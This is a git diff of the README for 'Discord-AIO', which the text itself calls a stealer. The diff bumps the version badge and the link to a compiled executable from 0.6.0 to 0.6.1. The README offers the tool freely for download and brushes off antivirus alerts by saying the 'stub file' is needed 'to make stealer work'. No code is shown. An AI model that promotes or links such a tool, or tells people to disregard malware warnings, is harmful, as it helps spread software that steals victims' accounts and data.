@@ -9,7 +9,7 @@
   
   [![developer](https://img.shields.io/badge/Developer-Nyxon-520702.svg?style=flat)](https://github.com/Nyxonn)
   [![discord](https://img.shields.io/badge/Discord-Nyxon%234418-520702.svg?style=flat)](https://discordapp.com/users/690624129153630248)
-  ![developer](https://img.shields.io/badge/Version-0.6.0-520702.svg?style=flat)
+  ![developer](https://img.shields.io/badge/Version-0.6.1-520702.svg?style=flat)
 </p>
 
 ## Disclaimer
@@ -132,7 +132,7 @@ Yes, the program is 100% free and open source.
 On Null Community [discord](https://discord.gg/qjrDprutvg).
 
 - How to use it?<br />
-You need to compile open source files or download released stable program from [here](https://github.com/Nyxonn/Discord-AIO/releases/download/0.6.0/Discord.AIO.exe) or discord above.
+You need to compile open source files or download released stable program from [here](https://github.com/Nyxonn/Discord-AIO/releases/download/0.6.1/Discord.AIO.exe) or discord above.
 
 - Antivirus reports program as malicious!<br />
 Program contains the stub file which is necessary to make stealer work, it's all open source so if you are extremly scared check it by yourself.
